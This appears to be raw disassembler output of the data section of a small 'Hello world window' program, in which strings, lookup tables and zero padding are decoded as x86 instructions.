00005F42  6E                outsb
00005F43  206E6F            and [esi+0x6f],ch
00005F46  7420              jz 0x5f68
00005F48  637265            arpl [edx+0x65],si
00005F4B  61                popa
00005F4C  7465              jz 0x5fb3
00005F4E  20746865          and [eax+ebp*2+0x65],dh
00005F52  206865            and [eax+0x65],ch
00005F55  6C                insb
00005F56  6C                insb
00005F57  6F                outsd
00005F58  20776F            and [edi+0x6f],dh
00005F5B  726C              jc 0x5fc9
00005F5D  64207769          and [fs:edi+0x69],dh
00005F61  6E                outsb
00005F62  646F              fs outsd
00005F64  772E              ja 0x5f94
00005F66  0000              add [eax],al
00005F68  45                inc ebp
00005F69  7272              jc 0x5fdd
00005F6B  6F                outsd
00005F6C  7200              jc 0x5f6e
00005F6E  0000              add [eax],al
00005F70  48                dec eax
00005F71  656C              gs insb
00005F73  6C                insb
00005F74  6F                outsd
00005F75  20776F            and [edi+0x6f],dh
00005F78  726C              jc 0x5fe6
00005F7A  64207769          and [fs:edi+0x69],dh
00005F7E  6E                outsb
00005F7F  646F              fs outsd
00005F81  7700              ja 0x5f83
00005F83  00496E            add [ecx+0x6e],cl
00005F86  666F              outsw
00005F88  0000              add [eax],al
00005F8A  0000              add [eax],al
00005F8C  25642C2564        and eax,0x64252c64
00005F91  2C25              sub al,0x25
00005F93  642C25            fs sub al,0x25
00005F96  642C25            fs sub al,0x25
00005F99  642C25            fs sub al,0x25
00005F9C  642C25            fs sub al,0x25
00005F9F  642C25            fs sub al,0x25
00005FA2  642C25            fs sub al,0x25
00005FA5  642C25            fs sub al,0x25
00005FA8  642C25            fs sub al,0x25
00005FAB  640000            add [fs:eax],al
00005FAE  0000              add [eax],al
00005FB0  E05F              loopne 0x6011
00005FB2  1E                push ds
00005FB3  00B85F1E0030      add [eax+0x30001e5f],bh
00005FB9  3132              xor [edx],esi
00005FBB  33343536373839    xor esi,[esi+0x39383736]
00005FC2  41                inc ecx
00005FC3  42                inc edx
00005FC4  43                inc ebx
00005FC5  44                inc esp
00005FC6  45                inc ebp
00005FC7  46                inc esi
00005FC8  47                inc edi
00005FC9  48                dec eax
00005FCA  49                dec ecx
00005FCB  4A                dec edx
00005FCC  4B                dec ebx
00005FCD  4C                dec esp
00005FCE  4D                dec ebp
00005FCF  4E                dec esi
00005FD0  4F                dec edi
00005FD1  50                push eax
00005FD2  51                push ecx
00005FD3  52                push edx
00005FD4  53                push ebx
00005FD5  54                push esp
00005FD6  55                push ebp
00005FD7  56                push esi
00005FD8  57                push edi
00005FD9  58                pop eax
00005FDA  59                pop ecx
00005FDB  5A                pop edx
00005FDC  0000              add [eax],al
00005FDE  0000              add [eax],al
00005FE0  3031              xor [ecx],dh
00005FE2  3233              xor dh,[ebx]
00005FE4  3435              xor al,0x35
00005FE6  3637              ss aaa
00005FE8  3839              cmp [ecx],bh
00005FEA  61                popa
00005FEB  626364            bound esp,[ebx+0x64]
00005FEE  65666768696A      gs a16 push word 0x6a69
00005FF4  6B6C6D6E6F        imul ebp,[ebp+ebp*2+0x6e],byte +0x6f
00005FF9  7071              jo 0x606c
00005FFB  7273              jc 0x6070
00005FFD  7475              jz 0x6074
00005FFF  7677              jna 0x6078
00006001  7879              js 0x607c
00006003  7A00              jpe 0x6005
00006005  0000              add [eax],al
00006007  003C4E            add [esi+ecx*2],bh
0000600A  55                push ebp
0000600B  4C                dec esp
0000600C  4C                dec esp
0000600D  3E0000            add [ds:eax],al
00006010  7598              jnz 0x5faa
00006012  0000              add [eax],al
00006014  7398              jnc 0x5fae
00006016  0000              add [eax],al
00006018  A0181E00B7        mov al,[0xb7001e18]
0000601D  181E              sbb [esi],bl
0000601F  00B7181E004B      add [edi+0x4b001e18],dh
00006025  2B1E              sub ebx,[esi]
00006027  004B2B            add [ebx+0x2b],cl
0000602A  1E                push ds
0000602B  004B2B            add [ebx+0x2b],cl
0000602E  1E                push ds
0000602F  004B2B            add [ebx+0x2b],cl
00006032  1E                push ds
00006033  004B2B            add [ebx+0x2b],cl
00006036  1E                push ds
00006037  004B2B            add [ebx+0x2b],cl
0000603A  1E                push ds
0000603B  0001              add [ecx],al
0000603D  0000              add [eax],al
0000603F  002E              add [esi],ch
00006041  0000              add [eax],al
00006043  0001              add [ecx],al
00006045  0000              add [eax],al
00006047  005260            add [edx+0x60],dl
0000604A  1E                push ds
0000604B  005260            add [edx+0x60],dl
0000604E  1E                push ds
0000604F  0000              add [eax],al
00006051  0020              add [eax],ah
00006053  0020              add [eax],ah
00006055  0020              add [eax],ah
00006057  0020              add [eax],ah
00006059  0020              add [eax],ah
0000605B  0020              add [eax],ah
0000605D  0020              add [eax],ah
0000605F  0020              add [eax],ah
00006061  0020              add [eax],ah
00006063  0028              add [eax],ch
00006065  0028              add [eax],ch
00006067  0028              add [eax],ch
00006069  0028              add [eax],ch
0000606B  0028              add [eax],ch
0000606D  0020              add [eax],ah
0000606F  0020              add [eax],ah
00006071  0020              add [eax],ah
00006073  0020              add [eax],ah
00006075  0020              add [eax],ah
00006077  0020              add [eax],ah
00006079  0020              add [eax],ah
0000607B  0020              add [eax],ah
0000607D  0020              add [eax],ah
0000607F  0020              add [eax],ah
00006081  0020              add [eax],ah
00006083  0020              add [eax],ah
00006085  0020              add [eax],ah
00006087  0020              add [eax],ah
00006089  0020              add [eax],ah
0000608B  0020              add [eax],ah
0000608D  0020              add [eax],ah
0000608F  0020              add [eax],ah
00006091  004800            add [eax+0x0],cl
00006094  1000              adc [eax],al
00006096  1000              adc [eax],al
00006098  1000              adc [eax],al
0000609A  1000              adc [eax],al
0000609C  1000              adc [eax],al
0000609E  1000              adc [eax],al
000060A0  1000              adc [eax],al
000060A2  1000              adc [eax],al
000060A4  1000              adc [eax],al
000060A6  1000              adc [eax],al
000060A8  1000              adc [eax],al
000060AA  1000              adc [eax],al
000060AC  1000              adc [eax],al
000060AE  1000              adc [eax],al
000060B0  1000              adc [eax],al
000060B2  8400              test [eax],al
000060B4  8400              test [eax],al
000060B6  8400              test [eax],al
000060B8  8400              test [eax],al
000060BA  8400              test [eax],al
000060BC  8400              test [eax],al
000060BE  8400              test [eax],al
000060C0  8400              test [eax],al
000060C2  8400              test [eax],al
000060C4  8400              test [eax],al
000060C6  1000              adc [eax],al
000060C8  1000              adc [eax],al
000060CA  1000              adc [eax],al
000060CC  1000              adc [eax],al
000060CE  1000              adc [eax],al
000060D0  1000              adc [eax],al
000060D2  1000              adc [eax],al
000060D4  810081008100      add dword [eax],0x810081
000060DA  810081008100      add dword [eax],0x810081
000060E0  0100              add [eax],eax
000060E2  0100              add [eax],eax
000060E4  0100              add [eax],eax
000060E6  0100              add [eax],eax
000060E8  0100              add [eax],eax
000060EA  0100              add [eax],eax
000060EC  0100              add [eax],eax
000060EE  0100              add [eax],eax
000060F0  0100              add [eax],eax
000060F2  0100              add [eax],eax
000060F4  0100              add [eax],eax
000060F6  0100              add [eax],eax
000060F8  0100              add [eax],eax
000060FA  0100              add [eax],eax
000060FC  0100              add [eax],eax
000060FE  0100              add [eax],eax
00006100  0100              add [eax],eax
00006102  0100              add [eax],eax
00006104  0100              add [eax],eax
00006106  0100              add [eax],eax
00006108  1000              adc [eax],al
0000610A  1000              adc [eax],al
0000610C  1000              adc [eax],al
0000610E  1000              adc [eax],al
00006110  1000              adc [eax],al
00006112  1000              adc [eax],al
00006114  82                db 0x82
00006115  008200820082      add [edx+0x82008200],al
0000611B  008200820002      add [edx+0x2008200],al
00006121  0002              add [edx],al
00006123  0002              add [edx],al
00006125  0002              add [edx],al
00006127  0002              add [edx],al
00006129  0002              add [edx],al
0000612B  0002              add [edx],al
0000612D  0002              add [edx],al
0000612F  0002              add [edx],al
00006131  0002              add [edx],al
00006133  0002              add [edx],al
00006135  0002              add [edx],al
00006137  0002              add [edx],al
00006139  0002              add [edx],al
0000613B  0002              add [edx],al
0000613D  0002              add [edx],al
0000613F  0002              add [edx],al
00006141  0002              add [edx],al
00006143  0002              add [edx],al
00006145  0002              add [edx],al
00006147  0010              add [eax],dl
00006149  0010              add [eax],dl
0000614B  0010              add [eax],dl
0000614D  0010              add [eax],dl
0000614F  0020              add [eax],ah
00006151  0000              add [eax],al
00006153  0000              add [eax],al
00006155  0000              add [eax],al
00006157  0000              add [eax],al
00006159  0000              add [eax],al
0000615B  0000              add [eax],al
0000615D  0000              add [eax],al
0000615F  0000              add [eax],al
00006161  0000              add [eax],al
00006163  0000              add [eax],al
00006165  0000              add [eax],al
00006167  0000              add [eax],al
00006169  0000              add [eax],al
0000616B  0000              add [eax],al
0000616D  0000              add [eax],al
0000616F  0000              add [eax],al
00006171  0000              add [eax],al
00006173  0000              add [eax],al
00006175  0000              add [eax],al
00006177  0000              add [eax],al
00006179  0000              add [eax],al
0000617B  0000              add [eax],al
0000617D  0000              add [eax],al
0000617F  0000              add [eax],al
00006181  0000              add [eax],al
00006183  0000              add [eax],al
00006185  0000              add [eax],al
00006187  0000              add [eax],al
00006189  0000              add [eax],al
0000618B  0000              add [eax],al
0000618D  0000              add [eax],al
0000618F  0000              add [eax],al
00006191  0000              add [eax],al
00006193  0000              add [eax],al
00006195  0000              add [eax],al
00006197  0000              add [eax],al
00006199  0000              add [eax],al
0000619B  0000              add [eax],al
0000619D  0000              add [eax],al
0000619F  0000              add [eax],al
000061A1  0000              add [eax],al
000061A3  0000              add [eax],al
000061A5  0000              add [eax],al
000061A7  0000              add [eax],al
000061A9  0000              add [eax],al
000061AB  0000              add [eax],al
000061AD  0000              add [eax],al
000061AF  0000              add [eax],al
000061B1  0000              add [eax],al
000061B3  0000              add [eax],al
000061B5  0000              add [eax],al
000061B7  0000              add [eax],al
000061B9  0000              add [eax],al
000061BB  0000              add [eax],al
000061BD  0000              add [eax],al
000061BF  0000              add [eax],al
000061C1  0000              add [eax],al
000061C3  0000              add [eax],al
000061C5  0000              add [eax],al
000061C7  0000              add [eax],al
000061C9  0000              add [eax],al
000061CB  0000              add [eax],al
000061CD  0000              add [eax],al
000061CF  0000              add [eax],al
000061D1  0000              add [eax],al
000061D3  0000              add [eax],al
000061D5  0000              add [eax],al
000061D7  0000              add [eax],al
000061D9  0000              add [eax],al
000061DB  0000              add [eax],al
000061DD  0000              add [eax],al
000061DF  0000              add [eax],al
000061E1  0000              add [eax],al
000061E3  0000              add [eax],al
000061E5  0000              add [eax],al
000061E7  0000              add [eax],al
000061E9  0000              add [eax],al
000061EB  0000              add [eax],al
000061ED  0000              add [eax],al
000061EF  0000              add [eax],al
000061F1  0000              add [eax],al
000061F3  0000              add [eax],al
000061F5  0000              add [eax],al
000061F7  0000              add [eax],al
000061F9  0000              add [eax],al
000061FB  0000              add [eax],al
000061FD  0000              add [eax],al
000061FF  0000              add [eax],al
00006201  0000              add [eax],al
00006203  0000              add [eax],al
00006205  0000              add [eax],al
00006207  0000              add [eax],al
00006209  0000              add [eax],al
0000620B  0000              add [eax],al
0000620D  0000              add [eax],al
0000620F  0000              add [eax],al
00006211  0000              add [eax],al
00006213  0000              add [eax],al
00006215  0000              add [eax],al
00006217  0000              add [eax],al
00006219  0000              add [eax],al
0000621B  0000              add [eax],al
0000621D  0000              add [eax],al
0000621F  0000              add [eax],al
00006221  0000              add [eax],al
00006223  0000              add [eax],al
00006225  0000              add [eax],al
00006227  0000              add [eax],al
00006229  0000              add [eax],al
0000622B  0000              add [eax],al
0000622D  0000              add [eax],al
0000622F  0000              add [eax],al
00006231  0000              add [eax],al
00006233  0000              add [eax],al
00006235  0000              add [eax],al
00006237  0000              add [eax],al
00006239  0000              add [eax],al
0000623B  0000              add [eax],al
0000623D  0000              add [eax],al
0000623F  0000              add [eax],al
00006241  0000              add [eax],al
00006243  0000              add [eax],al
00006245  0000              add [eax],al
00006247  0000              add [eax],al
00006249  0000              add [eax],al
0000624B  0000              add [eax],al
0000624D  0000              add [eax],al
0000624F  0000              add [eax],al
00006251  0000              add [eax],al
00006253  0000              add [eax],al
00006255  0000              add [eax],al
00006257  0000              add [eax],al
00006259  0400              add al,0x0
0000625B  0001              add [ecx],al
0000625D  FC                cld
0000625E  FF                db 0xFF
0000625F  FF350000000B      push dword [0xb000000]
00006265  0000              add [eax],al
00006267  004000            add [eax+0x0],al
0000626A  0000              add [eax],al
0000626C  FF03              inc dword [ebx]
0000626E  0000              add [eax],al
00006270  800000            add byte [eax],0x0
00006273  0081FFFFFF18      add [ecx+0x18ffffff],al
00006279  0000              add [eax],al
0000627B  0008              add [eax],cl
0000627D  0000              add [eax],al
0000627F  0020              add [eax],ah
00006281  0000              add [eax],al
00006283  007F00            add [edi+0x0],bh
00006286  0000              add [eax],al
00006288  0000              add [eax],al
0000628A  0000              add [eax],al
0000628C  0000              add [eax],al
0000628E  0000              add [eax],al
00006290  0000              add [eax],al
00006292  0000              add [eax],al
00006294  306D1E            xor [ebp+0x1e],ch
00006297  0000              add [eax],al
00006299  0000              add [eax],al
0000629B  0000              add [eax],al
0000629D  0000              add [eax],al
0000629F  0000              add [eax],al
000062A1  0000              add [eax],al
000062A3  0000              add [eax],al
000062A5  0000              add [eax],al
000062A7  0000              add [eax],al
000062A9  0000              add [eax],al
000062AB  0000              add [eax],al
000062AD  0000              add [eax],al
000062AF  0000              add [eax],al
000062B1  0000              add [eax],al
000062B3  00606D            add [eax+0x6d],ah
000062B6  1E                push ds
000062B7  0000              add [eax],al
000062B9  0000              add [eax],al
000062BB  0000              add [eax],al
000062BD  0000              add [eax],al
000062BF  0000              add [eax],al
000062C1  0000              add [eax],al
000062C3  00786D            add [eax+0x6d],bh
000062C6  1E                push ds
000062C7  0000              add [eax],al
000062C9  0000              add [eax],al
000062CB  0000              add [eax],al
000062CD  0000              add [eax],al
000062CF  0000              add [eax],al
000062D1  0000              add [eax],al
000062D3  00486D            add [eax+0x6d],cl
000062D6  1E                push ds
000062D7  0000              add [eax],al
000062D9  0000              add [eax],al
000062DB  0000              add [eax],al
000062DD  0000              add [eax],al
000062DF  0000              add [eax],al
000062E1  0000              add [eax],al
000062E3  0000              add [eax],al
000062E5  0000              add [eax],al
000062E7  0000              add [eax],al
000062E9  0000              add [eax],al
000062EB  0000              add [eax],al
000062ED  0000              add [eax],al
000062EF  0000              add [eax],al
000062F1  0000              add [eax],al
000062F3  0000              add [eax],al
000062F5  0000              add [eax],al
000062F7  0000              add [eax],al
000062F9  0000              add [eax],al
000062FB  0000              add [eax],al
000062FD  0000              add [eax],al
000062FF  0000              add [eax],al
00006301  0000              add [eax],al
00006303  0000              add [eax],al
00006305  0000              add [eax],al
00006307  0000              add [eax],al
00006309  0000              add [eax],al
0000630B  0000              add [eax],al
0000630D  0000              add [eax],al
0000630F  0000              add [eax],al
00006311  0000              add [eax],al
00006313  0000              add [eax],al
00006315  0000              add [eax],al
00006317  0000              add [eax],al
00006319  0000              add [eax],al
0000631B  0000              add [eax],al
0000631D  0000              add [eax],al
0000631F  0000              add [eax],al
00006321  0000              add [eax],al
00006323  0000              add [eax],al
00006325  0000              add [eax],al
00006327  0000              add [eax],al
00006329  0000              add [eax],al
0000632B  0000              add [eax],al
0000632D  0000              add [eax],al
0000632F  0000              add [eax],al
00006331  0000              add [eax],al
00006333  0000              add [eax],al
00006335  0000              add [eax],al
00006337  0000              add [eax],al
00006339  0000              add [eax],al
0000633B  0000              add [eax],al
0000633D  0000              add [eax],al
0000633F  0000              add [eax],al
00006341  0000              add [eax],al
00006343  0000              add [eax],al
00006345  0000              add [eax],al
00006347  0000              add [eax],al
00006349  0000              add [eax],al
0000634B  0000              add [eax],al
0000634D  0000              add [eax],al
0000634F  004300            add [ebx+0x0],al
00006352  0000              add [eax],al
00006354  43                inc ebx
00006355  0000              add [eax],al
00006357  0000              add [eax],al
00006359  0000              add [eax],al
0000635B  0000              add [eax],al
0000635D  0000              add [eax],al
0000635F  0000              add [eax],al
00006361  0000              add [eax],al
00006363  0000              add [eax],al
00006365  0000              add [eax],al
00006367  0000              add [eax],al
00006369  0000              add [eax],al
0000636B  0000              add [eax],al
0000636D  0000              add [eax],al
0000636F  0000              add [eax],al
00006371  0000              add [eax],al
00006373  0000              add [eax],al
00006375  0000              add [eax],al
00006377  0000              add [eax],al
00006379  0000              add [eax],al
0000637B  0000              add [eax],al
0000637D  0000              add [eax],al
0000637F  0000              add [eax],al
00006381  0000              add [eax],al
00006383  0000              add [eax],al
00006385  0000              add [eax],al
00006387  0000              add [eax],al
00006389  0000              add [eax],al
0000638B  0000              add [eax],al
0000638D  0000              add [eax],al
0000638F  0000              add [eax],al
00006391  0000              add [eax],al
00006393  0000              add [eax],al
00006395  0000              add [eax],al
00006397  0000              add [eax],al
00006399  0000              add [eax],al
0000639B  0000              add [eax],al
0000639D  0000              add [eax],al
0000639F  0000              add [eax],al
000063A1  0000              add [eax],al
000063A3  0000              add [eax],al
000063A5  0000              add [eax],al
000063A7  0000              add [eax],al
000063A9  0000              add [eax],al
000063AB  0000              add [eax],al
000063AD  0000              add [eax],al
000063AF  0000              add [eax],al
000063B1  0000              add [eax],al
000063B3  0000              add [eax],al
000063B5  0000              add [eax],al
000063B7  0000              add [eax],al
000063B9  0000              add [eax],al
000063BB  0000              add [eax],al
000063BD  0000              add [eax],al
000063BF  0000              add [eax],al
000063C1  0000              add [eax],al
000063C3  0000              add [eax],al
000063C5  0000              add [eax],al
000063C7  0000              add [eax],al
000063C9  0000              add [eax],al
000063CB  0000              add [eax],al
000063CD  0000              add [eax],al
000063CF  0000              add [eax],al
000063D1  0000              add [eax],al
000063D3  0000              add [eax],al
000063D5  0000              add [eax],al
000063D7  004300            add [ebx+0x0],al
000063DA  0000              add [eax],al
000063DC  0000              add [eax],al
000063DE  0000              add [eax],al
000063E0  0000              add [eax],al
000063E2  0000              add [eax],al
000063E4  0000              add [eax],al
000063E6  0000              add [eax],al
000063E8  0000              add [eax],al
000063EA  0000              add [eax],al
000063EC  0000              add [eax],al
000063EE  0000              add [eax],al
000063F0  0000              add [eax],al
000063F2  0000              add [eax],al
000063F4  0000              add [eax],al
000063F6  0000              add [eax],al
000063F8  0000              add [eax],al
000063FA  0000              add [eax],al
000063FC  0000              add [eax],al
000063FE  0000              add [eax],al
00006400  0000              add [eax],al
00006402  0000              add [eax],al
00006404  0000              add [eax],al
00006406  0000              add [eax],al
00006408  0000              add [eax],al
0000640A  0000              add [eax],al
0000640C  0000              add [eax],al
0000640E  0000              add [eax],al
00006410  0000              add [eax],al
00006412  0000              add [eax],al
00006414  0000              add [eax],al
00006416  0000              add [eax],al
00006418  0000              add [eax],al
0000641A  0000              add [eax],al
0000641C  0000              add [eax],al
0000641E  0000              add [eax],al
00006420  0000              add [eax],al
00006422  0000              add [eax],al
00006424  0000              add [eax],al
00006426  0000              add [eax],al
00006428  0000              add [eax],al
0000642A  0000              add [eax],al
0000642C  0000              add [eax],al
0000642E  0000              add [eax],al
00006430  0000              add [eax],al
00006432  0000              add [eax],al
00006434  0000              add [eax],al
00006436  0000              add [eax],al
00006438  0000              add [eax],al
0000643A  0000              add [eax],al
0000643C  0000              add [eax],al
0000643E  0000              add [eax],al
00006440  0000              add [eax],al
00006442  0000              add [eax],al
00006444  0000              add [eax],al
00006446  0000              add [eax],al
00006448  0000              add [eax],al
0000644A  0000              add [eax],al
0000644C  0000              add [eax],al
0000644E  0000              add [eax],al
00006450  0000              add [eax],al
00006452  0000              add [eax],al
00006454  0000              add [eax],al
00006456  0000              add [eax],al
00006458  0000              add [eax],al
0000645A  0000              add [eax],al
0000645C  51                push ecx
0000645D  3C1E              cmp al,0x1e
0000645F  0001              add [ecx],al
00006461  0000              add [eax],al
00006463  0000              add [eax],al
00006465  0000              add [eax],al
00006467  0001              add [ecx],al
00006469  0000              add [eax],al
0000646B  0016              add [esi],dl
0000646D  0000              add [eax],al
0000646F  0002              add [edx],al
00006471  0000              add [eax],al
00006473  0002              add [edx],al
00006475  0000              add [eax],al
00006477  0003              add [ebx],al
00006479  0000              add [eax],al
0000647B  0002              add [edx],al
0000647D  0000              add [eax],al
0000647F  000400            add [eax+eax],al
00006482  0000              add [eax],al
00006484  1800              sbb [eax],al
00006486  0000              add [eax],al
00006488  050000000D        add eax,0xd000000
0000648D  0000              add [eax],al
0000648F  0006              add [esi],al
00006491  0000              add [eax],al
00006493  0009              add [ecx],cl
00006495  0000              add [eax],al
00006497  0007              add [edi],al
00006499  0000              add [eax],al
0000649B  000C00            add [eax+eax],cl
0000649E  0000              add [eax],al
000064A0  0800              or [eax],al
000064A2  0000              add [eax],al
000064A4  0C00              or al,0x0
000064A6  0000              add [eax],al
000064A8  0900              or [eax],eax
000064AA  0000              add [eax],al
000064AC  0C00              or al,0x0
000064AE  0000              add [eax],al
000064B0  0A00              or al,[eax]
000064B2  0000              add [eax],al
000064B4  07                pop es
000064B5  0000              add [eax],al
000064B7  000B              add [ebx],cl
000064B9  0000              add [eax],al
000064BB  0008              add [eax],cl
000064BD  0000              add [eax],al
000064BF  000C00            add [eax+eax],cl
000064C2  0000              add [eax],al
000064C4  16                push ss
000064C5  0000              add [eax],al
000064C7  000D00000016      add [0x16000000],cl
000064CD  0000              add [eax],al
000064CF  000F              add [edi],cl
000064D1  0000              add [eax],al
000064D3  0002              add [edx],al
000064D5  0000              add [eax],al
000064D7  0010              add [eax],dl
000064D9  0000              add [eax],al
000064DB  000D00000011      add [0x11000000],cl
000064E1  0000              add [eax],al
000064E3  0012              add [edx],dl
000064E5  0000              add [eax],al
000064E7  0012              add [edx],dl
000064E9  0000              add [eax],al
000064EB  0002              add [edx],al
000064ED  0000              add [eax],al
000064EF  0021              add [ecx],ah
000064F1  0000              add [eax],al
000064F3  000D00000035      add [0x35000000],cl
000064F9  0000              add [eax],al
000064FB  0002              add [edx],al
000064FD  0000              add [eax],al
000064FF  004100            add [ecx+0x0],al
00006502  0000              add [eax],al
00006504  0D00000043        or eax,0x43000000
00006509  0000              add [eax],al
0000650B  0002              add [edx],al
0000650D  0000              add [eax],al
0000650F  005000            add [eax+0x0],dl
00006512  0000              add [eax],al
00006514  1100              adc [eax],eax
00006516  0000              add [eax],al
00006518  52                push edx
00006519  0000              add [eax],al
0000651B  000D00000053      add [0x53000000],cl
00006521  0000              add [eax],al
00006523  000D00000057      add [0x57000000],cl
00006529  0000              add [eax],al
0000652B  0016              add [esi],dl
0000652D  0000              add [eax],al
0000652F  005900            add [ecx+0x0],bl
00006532  0000              add [eax],al
00006534  0B00              or eax,[eax]
00006536  0000              add [eax],al
00006538  6C                insb
00006539  0000              add [eax],al
0000653B  000D0000006D      add [0x6d000000],cl
00006541  0000              add [eax],al
00006543  0020              add [eax],ah
00006545  0000              add [eax],al
00006547  007000            add [eax+0x0],dh
0000654A  0000              add [eax],al
0000654C  1C00              sbb al,0x0
0000654E  0000              add [eax],al
00006550  7200              jc 0x6552
00006552  0000              add [eax],al
00006554  0900              or [eax],eax
00006556  0000              add [eax],al
00006558  06                push es
00006559  0000              add [eax],al
0000655B  0016              add [esi],dl
0000655D  0000              add [eax],al
0000655F  00800000000A      add [eax+0xa000000],al
00006565  0000              add [eax],al
00006567  00810000000A      add [ecx+0xa000000],al
0000656D  0000              add [eax],al
0000656F  008200000009      add [edx+0x9000000],al
00006575  0000              add [eax],al
00006577  008300000016      add [ebx+0x16000000],al
0000657D  0000              add [eax],al
0000657F  00840000000D00    add [eax+eax+0xd0000],al
00006586  0000              add [eax],al
00006588  91                xchg eax,ecx
00006589  0000              add [eax],al
0000658B  0029              add [ecx],ch
0000658D  0000              add [eax],al
0000658F  009E0000000D      add [esi+0xd000000],bl
00006595  0000              add [eax],al
00006597  00A100000002      add [ecx+0x2000000],ah
0000659D  0000              add [eax],al
0000659F  00A40000000B00    add [eax+eax+0xb0000],ah
000065A6  0000              add [eax],al
000065A8  A7                cmpsd
000065A9  0000              add [eax],al
000065AB  000D000000B7      add [0xb7000000],cl
000065B1  0000              add [eax],al
000065B3  0011              add [ecx],dl
000065B5  0000              add [eax],al
000065B7  00CE              add dh,cl
000065B9  0000              add [eax],al
000065BB  0002              add [edx],al
000065BD  0000              add [eax],al
000065BF  00D7              add bh,dl
000065C1  0000              add [eax],al
000065C3  000B              add [ebx],cl
000065C5  0000              add [eax],al
000065C7  0018              add [eax],bl
000065C9  07                pop es
000065CA  0000              add [eax],al
000065CC  0C00              or al,0x0
000065CE  0000              add [eax],al
000065D0  050000C00B        add eax,0xbc00000
000065D5  0000              add [eax],al
000065D7  0000              add [eax],al
000065D9  0000              add [eax],al
000065DB  001D0000C004      add [0x4c00000],bl
000065E1  0000              add [eax],al
000065E3  0000              add [eax],al
000065E5  0000              add [eax],al
000065E7  00960000C004      add [esi+0x4c00000],dl
000065ED  0000              add [eax],al
000065EF  0000              add [eax],al
000065F1  0000              add [eax],al
000065F3  008D0000C008      add [ebp+0x8c00000],cl
000065F9  0000              add [eax],al
000065FB  0000              add [eax],al
000065FD  0000              add [eax],al
000065FF  008E0000C008      add [esi+0x8c00000],cl
00006605  0000              add [eax],al
00006607  0000              add [eax],al
00006609  0000              add [eax],al
0000660B  008F0000C008      add [edi+0x8c00000],cl
00006611  0000              add [eax],al
00006613  0000              add [eax],al
00006615  0000              add [eax],al
00006617  00900000C008      add [eax+0x8c00000],dl
0000661D  0000              add [eax],al
0000661F  0000              add [eax],al
00006621  0000              add [eax],al
00006623  00910000C008      add [ecx+0x8c00000],dl
00006629  0000              add [eax],al
0000662B  0000              add [eax],al
0000662D  0000              add [eax],al
0000662F  00920000C008      add [edx+0x8c00000],dl
00006635  0000              add [eax],al
00006637  0000              add [eax],al
00006639  0000              add [eax],al
0000663B  00930000C008      add [ebx+0x8c00000],dl
00006641  0000              add [eax],al
00006643  0000              add [eax],al
00006645  0000              add [eax],al
00006647  0003              add [ebx],al
00006649  0000              add [eax],al
0000664B  0007              add [edi],al
0000664D  0000              add [eax],al
0000664F  007800            add [eax+0x0],bh
00006652  0000              add [eax],al
00006654  0A00              or al,[eax]
00006656  0000              add [eax],al
00006658  0000              add [eax],al
0000665A  0000              add [eax],al
0000665C  0000              add [eax],al
0000665E  0000              add [eax],al
00006660  FF                db 0xFF
00006661  FF                db 0xFF
00006662  FF                db 0xFF
00006663  FF20              jmp near [eax]
00006665  0593190000        add eax,0x1993
0000666A  0000              add [eax],al
0000666C  0000              add [eax],al
0000666E  0000              add [eax],al
00006670  0000              add [eax],al
00006672  0000              add [eax],al
00006674  0000              add [eax],al
00006676  0000              add [eax],al
00006678  0000              add [eax],al
0000667A  0000              add [eax],al
0000667C  0000              add [eax],al
0000667E  0000              add [eax],al
00006680  FF                db 0xFF
00006681  FF                db 0xFF
00006682  FF                db 0xFF
00006683  FF00              inc dword [eax]
00006685  0A00              or al,[eax]
00006687  0000              add [eax],al
00006689  0000              add [eax],al
0000668B  0000              add [eax],al
0000668D  0000              add [eax],al
0000668F  0000              add [eax],al
00006691  0000              add [eax],al
00006693  0000              add [eax],al
00006695  0000              add [eax],al
00006697  0000              add [eax],al
00006699  0000              add [eax],al
0000669B  0000              add [eax],al
0000669D  0000              add [eax],al
0000669F  0000              add [eax],al
000066A1  0000              add [eax],al
000066A3  0010              add [eax],dl
000066A5  0000              add [eax],al
000066A7  0002              add [edx],al
000066A9  0000              add [eax],al
000066AB  002C5A            add [edx+ebx*2],ch
000066AE  1E                push ds
000066AF  0008              add [eax],cl
000066B1  0000              add [eax],al
000066B3  0000              add [eax],al
000066B5  5A                pop edx
000066B6  1E                push ds
000066B7  0009              add [ecx],cl
000066B9  0000              add [eax],al
000066BB  00D4              add ah,dl
000066BD  59                pop ecx
000066BE  1E                push ds
000066BF  000A              add [edx],cl
000066C1  0000              add [eax],al
000066C3  00B0591E0010      add [eax+0x10001e59],dh
000066C9  0000              add [eax],al
000066CB  0084591E001100    add [ecx+ebx*2+0x11001e],al
000066D2  0000              add [eax],al
000066D4  54                push esp
000066D5  59                pop ecx
000066D6  1E                push ds
000066D7  0012              add [edx],dl
000066D9  0000              add [eax],al
000066DB  0030              add [eax],dh
000066DD  59                pop ecx
000066DE  1E                push ds
000066DF  0013              add [ebx],dl
000066E1  0000              add [eax],al
000066E3  000459            add [ecx+ebx*2],al
000066E6  1E                push ds
000066E7  0018              add [eax],bl
000066E9  0000              add [eax],al
000066EB  00CC              add ah,cl
000066ED  58                pop eax
000066EE  1E                push ds
000066EF  0019              add [ecx],bl
000066F1  0000              add [eax],al
000066F3  00A4581E001A00    add [eax+ebx*2+0x1a001e],ah
000066FA  0000              add [eax],al
000066FC  6C                insb
000066FD  58                pop eax
000066FE  1E                push ds
000066FF  001B              add [ebx],bl
00006701  0000              add [eax],al
00006703  003458            add [eax+ebx*2],dh
00006706  1E                push ds
00006707  001C00            add [eax+eax],bl
0000670A  0000              add [eax],al
0000670C  0C58              or al,0x58
0000670E  1E                push ds
0000670F  007800            add [eax+0x0],bh
00006712  0000              add [eax],al
00006714  FC                cld
00006715  57                push edi
00006716  1E                push ds
00006717  007900            add [ecx+0x0],bh
0000671A  0000              add [eax],al
0000671C  EC                in al,dx
0000671D  57                push edi
0000671E  1E                push ds
0000671F  007A00            add [edx+0x0],bh
00006722  0000              add [eax],al
00006724  DC571E            fcom qword [edi+0x1e]
00006727  00FC              add ah,bh
00006729  0000              add [eax],al
0000672B  00D8              add al,bl
0000672D  57                push edi
0000672E  1E                push ds
0000672F  00FF              add bh,bh
00006731  0000              add [eax],al
00006733  00C8              add al,cl
00006735  57                push edi
00006736  1E                push ds
00006737  00F8              add al,bh
00006739  0300              add eax,[eax]
0000673B  004067            add [eax+0x67],al
0000673E  1E                push ds
0000673F  00D8              add al,bl
00006741  5B                pop ebx
00006742  1E                push ds
00006743  00D4              add ah,dl
00006745  5B                pop ebx
00006746  1E                push ds
00006747  00D0              add al,dl
00006749  5B                pop ebx
0000674A  1E                push ds
0000674B  00CC              add ah,cl
0000674D  5B                pop ebx
